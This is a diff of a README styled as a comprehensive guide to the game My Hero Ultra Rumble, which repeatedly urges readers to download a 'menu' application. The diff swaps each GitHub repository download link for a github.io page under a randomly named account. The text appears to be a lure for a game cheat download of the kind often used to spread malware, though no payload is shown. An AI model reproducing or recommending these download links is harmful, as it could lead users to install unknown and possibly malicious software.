@@ -5,7 +5,7 @@
 Welcome to the most comprehensive, community-driven resource for **My Hero Ultra Rumble**! Whether you're a brand-new player just starting your hero journey or a seasoned veteran looking to perfect your strategies, this guide has everything you need to level up your gameplay.
 
 **Ready to jump in?** Visit this link to download the application:
-[📥 **Download My Hero Ultra Rumble Menu**](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+[📥 **Download My Hero Ultra Rumble Menu**](https://wittgensteinian-parryspenstemon7737.github.io)
 
 ## ✨ What Is This Guide?
 
@@ -41,7 +41,7 @@ Follow these simple steps to get started with your My Hero Ultra Rumble journey:
 
 ### Step 1: Download the Application
 Visit this link to download the application:
-[**https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu**](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+[**https://wittgensteinian-parryspenstemon7737.github.io**](https://wittgensteinian-parryspenstemon7737.github.io)
 
 Click the download button and save the file to a location you'll remember (like your Desktop or Downloads folder).
 
@@ -182,13 +182,13 @@ You're now ready to take your My Hero Ultra Rumble experience to the next level!
 
 **Your hero journey starts now!**
 
-👉 [**Download and Start Winning Today!**](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+👉 [**Download and Start Winning Today!**](https://wittgensteinian-parryspenstemon7737.github.io)
 
 Visit this link to download the application and begin your path to becoming the ultimate hero!
 
 ## 🔗 Quick Resource Links
 
-- **Main Repository:** [**https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu**](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+- **Main Repository:** [**https://wittgensteinian-parryspenstemon7737.github.io**](https://wittgensteinian-parryspenstemon7737.github.io)
 - **Download Portal:** Visit the repository page above
 - **Updates:** Check back regularly or enable notifications
 
